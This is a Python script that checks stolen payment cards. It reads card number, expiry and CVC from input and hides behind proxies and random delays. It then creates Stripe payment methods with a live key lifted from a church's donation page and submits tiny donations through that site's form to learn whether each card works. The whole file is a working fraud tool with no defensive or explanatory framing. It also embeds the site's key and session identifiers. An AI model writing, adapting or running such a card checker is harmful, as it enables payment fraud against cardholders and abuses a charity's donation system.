import random
import requests, re, time
from utils import lookBin, genProxy


def Tele(ccx):
    try:
        import requests
        r = requests.session()

        urlToGet = "http://api.ipify.org/"
        r = requests.get(urlToGet, proxies=genProxy())
        ip=r.text
    except:
        ip="something wrongs"
    try:
        import requests

        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3]
        if "20" in yy:  # Mo3gza
            yy = yy.split("20")[1]
        time.sleep(random.randrange(2,7))

        headers = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'Accept': 'application/json',
    'Content-Type': 'application/x-www-form-urlencoded',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'origin': 'https://js.stripe.com',
    'sec-fetch-site': 'same-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://js.stripe.com/',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
}

        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=9ffc663c-69d5-4005-aabd-782094c4d8ad1ddbb2&muid=ed2575d5-58d3-4ce4-af77-5862881eb0d9ec71bb&sid=0a58ec1e-c6d7-4945-8aa2-99835af484c4776191&pasted_fields=number&payment_user_agent=stripe.js%2F17c82e8501%3B+stripe-js-v3%2F17c82e8501%3B+card-element&referrer=https%3A%2F%2Fwww.standrewspr.org&time_on_page=263001&key=pk_live_51OEy4fGnIMCjx8gS2EDDarDZ5FHtPmFCS8uvQ3vhCSaT3h0UzBFs8tAyu6yCLw2TSN5fNyaOWkRrupzYX86ajnaD00o5gjFsly'

        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        try:
            id = response.json()['id']
        except:
            pass


        cookies = {
    '__stripe_mid': 'ed2575d5-58d3-4ce4-af77-5862881eb0d9ec71bb',
    '__stripe_sid': '0a58ec1e-c6d7-4945-8aa2-99835af484c4776191',
}

        headers = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'x-requested-with': 'XMLHttpRequest',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'origin': 'https://www.standrewspr.org',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://www.standrewspr.org/donate/',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    # 'Cookie': '__stripe_mid=ed2575d5-58d3-4ce4-af77-5862881eb0d9ec71bb; __stripe_sid=0a58ec1e-c6d7-4945-8aa2-99835af484c4776191',
}

        params = {
    't': '1733909636309',
}

        data = {
    'data': f'__fluent_form_embded_post_id=1505&_fluentform_11_fluentformnonce=8c3843aa96&_wp_http_referer=%2Fdonate%2F&input_text=Yedgdg&names%5Bfirst_name%5D=Thu&names%5Blast_name%5D=Kyi&phone=6886868565&custom-payment-amount=0.5&payment_method=stripe&input_text_1=&input_text_3=&input_text_2=&__stripe_payment_method_id={id}',
    'action': 'fluentform_submit',
    'form_id': '11',
}

        r2 = requests.post(
    'https://www.standrewspr.org/wp-admin/admin-ajax.php',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
)
        return (ccx, r2.json(),ip)
    except:
        return "error", "error",ip